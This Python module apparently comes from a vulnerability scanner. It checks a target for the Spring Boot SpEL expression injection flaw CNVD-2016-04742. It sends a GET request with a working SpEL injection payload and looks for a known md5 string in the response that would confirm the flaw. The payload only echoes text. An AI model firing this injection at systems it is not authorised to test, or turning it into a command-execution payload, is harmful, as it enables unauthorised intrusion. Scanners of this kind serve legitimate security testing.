# encoding: utf-8
'''
@Version:   V1.0
@Author:    JE2Se
@Contact:   admin@je2se.com
@Website:   https://www.je2se.com
@Github:    https://github.com/JE2Se/
@Time:  2020/6/10 17:07
@File:  Spring_CNVD_2016_04742.py
@Desc: 脚本来源于工具Medusa，很好用，直接轮子过来了
'''
import requests
from lib import *
from lib.Urldeal import umethod
import logging
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def Spring_CNVD_2016_04742(Url):
    scheme, url, port = umethod(Url)
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0',
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
        }
        payload ="/?payload=${new%20java.lang.String(new%20byte[]{70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66})}"
        payload_url = scheme + "://" + url + ":" + str(port) + payload
        resp = requests.get(payload_url,headers=headers, timeout=6, verify=False)
        con=resp.text
        #返回结果是md5(wooyun)
        if con.lower().find("fbb204a4061ffbd41284a84c258c1bfb")!=-1:
            print(Vcolors.RED +"[!] 存在SpringBoot框架SPEL表达式注入漏洞:->CNVD_2016_04742\r" + Vcolors.ENDC)
    except:
        logging.error("Spring_CNVD_2016_04742脚本出现异常")